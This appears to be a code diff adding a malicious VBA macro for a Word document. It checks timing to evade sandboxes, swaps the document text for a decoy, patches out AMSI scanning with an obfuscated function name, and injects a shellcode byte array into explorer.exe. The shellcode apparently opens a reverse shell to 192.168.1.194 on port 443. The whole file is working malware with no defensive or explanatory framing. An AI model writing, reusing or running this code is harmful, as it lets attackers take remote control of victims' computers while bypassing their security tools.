@@ -1,0 +1,90 @@
+Private Declare PtrSafe Function OpenProcess Lib "KERNEL32" (ByVal dwDesiredAcess As Long, ByVal bInheritHandle As Long, ByVal dwProcessId As LongPtr) As LongPtr
+Private Declare PtrSafe Function VirtualAllocEx Lib "KERNEL32" (ByVal hProcess As Integer, ByVal lpAddress As LongPtr, ByVal dwSize As LongPtr, ByVal fAllocType As LongPtr, ByVal flProtect As LongPtr) As LongPtr
+Private Declare PtrSafe Function WriteProcessMemory Lib "KERNEL32" (ByVal hProcess As LongPtr, ByVal lpBaseAddress As LongPtr, ByRef lpBuffer As LongPtr, ByVal nSize As LongPtr, ByRef lpNumberOfBytesWritten As LongPtr) As LongPtr
+Private Declare PtrSafe Function CreateRemoteThread Lib "KERNEL32" (ByVal ProcessHandle As LongPtr, ByVal lpThreadAttributes As Long, ByVal dwStackSize As LongPtr, ByVal lpStartAddress As LongPtr, ByVal lpParameter As Long, ByVal dwCreationFlags As Long, ByVal lpThreadID As Long) As LongPtr
+Private Declare PtrSafe Sub patched Lib "KERNEL32" Alias "RtlFillMemory" (Destination As Any, ByVal Length As Long, ByVal Fill As Byte)
+Private Declare PtrSafe Function GetPrAddr Lib "KERNEL32" Alias "GetProcAddress" (ByVal hModule As LongPtr, ByVal lpProcName As String) As LongPtr
+Private Declare PtrSafe Function getmod Lib "KERNEL32" Alias "GetModuleHandleA" (ByVal lpLibFileName As String) As LongPtr
+Private Declare PtrSafe Function VirtPro Lib "KERNEL32" Alias "VirtualProtect" (lpAddress As Any, ByVal dwSize As LongPtr, ByVal flNewProcess As LongPtr, lpflOldProtect As LongPtr) As LongPtr
+Private Declare PtrSafe Function Sleep Lib "KERNEL32" (ByVal mili As Long) As Long
+Function mymacro()
+ Dim myTime
+ myTime = Time
+ Dim Timein As Date
+ Timein = Date + myTime
+ Sleep (4000)
+ Dim second_time
+ second_time = Time
+ Dim Timeout As Date
+ Timeout = Date + second_time
+ Dim subtime As Variant
+ subtime = DateDiff("s", Timein, Timeout)
+ Dim vOut As Integer
+ vOut = CInt(subtime)
+ If subtime < 3.5 Then
+    Exit Function
+ End If
+ ActiveDocument.Content.Select
+ Selection.Delete
+ ActiveDocument.AttachedTemplate.AutoTextEntries("TheDoc").Insert Where:=Selection.Range, RichText:=True
+ patch
+ pid = getPID
+ Handle = OpenProcess(&H1F0FFF, False, pid)
+ 
+ buf = Array(72, 131, 228, 240, 232, 204, 0, 0, 0, 65, 81, 65, 80, 82, 81, 72, 49, 210, 101, 72, 139, 82, 96, 86, 72, 139, 82, 24, 72, 139, 82, 32, 72, 139, 114, 80, 77, 49, 201, 72, 15, 183, 74, 74, 72, 49, 192, 172, 60, 97, 124, 2, 44, 32, 65, 193, 201, 13, 65, 1, 193, 226, 237, 82, 65, 81, 72, 139, 82, 32, 139, 66, 60, 72, 1, 208, 102, 129, 120, 24, _
+11, 2, 15, 133, 114, 0, 0, 0, 139, 128, 136, 0, 0, 0, 72, 133, 192, 116, 103, 72, 1, 208, 139, 72, 24, 80, 68, 139, 64, 32, 73, 1, 208, 227, 86, 72, 255, 201, 77, 49, 201, 65, 139, 52, 136, 72, 1, 214, 72, 49, 192, 172, 65, 193, 201, 13, 65, 1, 193, 56, 224, 117, 241, 76, 3, 76, 36, 8, 69, 57, 209, 117, 216, 88, 68, 139, 64, 36, 73, 1, _
+208, 102, 65, 139, 12, 72, 68, 139, 64, 28, 73, 1, 208, 65, 139, 4, 136, 72, 1, 208, 65, 88, 65, 88, 94, 89, 90, 65, 88, 65, 89, 65, 90, 72, 131, 236, 32, 65, 82, 255, 224, 88, 65, 89, 90, 72, 139, 18, 233, 75, 255, 255, 255, 93, 73, 190, 119, 115, 50, 95, 51, 50, 0, 0, 65, 86, 73, 137, 230, 72, 129, 236, 160, 1, 0, 0, 73, 137, 229, 73, _
+188, 2, 0, 1, 187, 192, 168, 1, 194, 65, 84, 73, 137, 228, 76, 137, 241, 65, 186, 76, 119, 38, 7, 255, 213, 76, 137, 234, 104, 1, 1, 0, 0, 89, 65, 186, 41, 128, 107, 0, 255, 213, 106, 10, 65, 94, 80, 80, 77, 49, 201, 77, 49, 192, 72, 255, 192, 72, 137, 194, 72, 255, 192, 72, 137, 193, 65, 186, 234, 15, 223, 224, 255, 213, 72, 137, 199, 106, 16, 65, _
+88, 76, 137, 226, 72, 137, 249, 65, 186, 153, 165, 116, 97, 255, 213, 133, 192, 116, 10, 73, 255, 206, 117, 229, 232, 147, 0, 0, 0, 72, 131, 236, 16, 72, 137, 226, 77, 49, 201, 106, 4, 65, 88, 72, 137, 249, 65, 186, 2, 217, 200, 95, 255, 213, 131, 248, 0, 126, 85, 72, 131, 196, 32, 94, 137, 246, 106, 64, 65, 89, 104, 0, 16, 0, 0, 65, 88, 72, 137, 242, _
+72, 49, 201, 65, 186, 88, 164, 83, 229, 255, 213, 72, 137, 195, 73, 137, 199, 77, 49, 201, 73, 137, 240, 72, 137, 218, 72, 137, 249, 65, 186, 2, 217, 200, 95, 255, 213, 131, 248, 0, 125, 40, 88, 65, 87, 89, 104, 0, 64, 0, 0, 65, 88, 106, 0, 90, 65, 186, 11, 47, 15, 48, 255, 213, 87, 89, 65, 186, 117, 110, 77, 97, 255, 213, 73, 255, 206, 233, 60, 255, _
+255, 255, 72, 1, 195, 72, 41, 198, 72, 133, 246, 117, 180, 65, 255, 231, 88, 106, 0, 89, 187, 224, 29, 42, 10, 65, 137, 218, 255, 213)
+
+ 
+ addr = VirtualAllocEx(Handle, 0, UBound(buf), &H3000, &H40)
+ For counter = LBound(buf) To UBound(buf)
+    Data = buf(counter)
+    Address = addr + counter
+    res = WriteProcessMemory(Handle, Address, Data, 1, 0&)
+ Next counter
+ thread = CreateRemoteThread(Handle, 0, 0, addr, 0, 0, 0)
+End Function
+Function patch()
+
+Dim lib As LongPtr
+Dim Func_addr As LongPtr
+Dim temp As LongPtr
+Dim old As LongPtr
+Dim StrFile As String
+
+StrFile = Dir("c:\windows\system32\a?s?.d*")
+lib = getmod(StrFile)
+Func_addr = GetPrAddr(lib, "Am" & Chr(115) & Chr(105) & "U" & Chr(97) & "c" & "Init" & Chr(105) & Chr(97) & "lize") - 96
+
+temp = VirtPro(ByVal Func_addr, 32, 64, 0)
+patched ByVal (Func_addr), 1, ByVal ("&H" & "90")
+patched ByVal (Func_addr + 1), 1, ByVal ("&H" & "C3")
+temp = VirtPro(ByVal Func_addr, 32, old, 0)
+
+Func_addr = GetPrAddr(lib, "Am" & Chr(115) & Chr(105) & "U" & Chr(97) & "c" & "Init" & Chr(105) & Chr(97) & "lize") - 352
+
+temp = VirtPro(ByVal Func_addr, 32, 64, old)
+patched ByVal (Func_addr), 1, ByVal ("&H" & "90")
+patched ByVal (Func_addr + 1), 1, ByVal ("&H" & "C3")
+temp = VirtPro(ByVal Func_addr, 32, old, 0)
+
+End Function
+Function getPID()
+    Dim objServices As Object, objProcessSet As Object, Process As Object
+
+    Set objServices = GetObject("winmgmts:\\.\root\CIMV2")
+    Set objProcessSet = objServices.ExecQuery("SELECT ProcessID, name FROM Win32_Process WHERE name = ""explorer.exe""", , 48)
+    For Each Process In objProcessSet
+    getPID = Process.ProcessID
+    Next
+End Function
+Sub test()
+mymacro
+End Sub
+Sub queen()
+    Application.Run MacroName:="test"
+End Sub
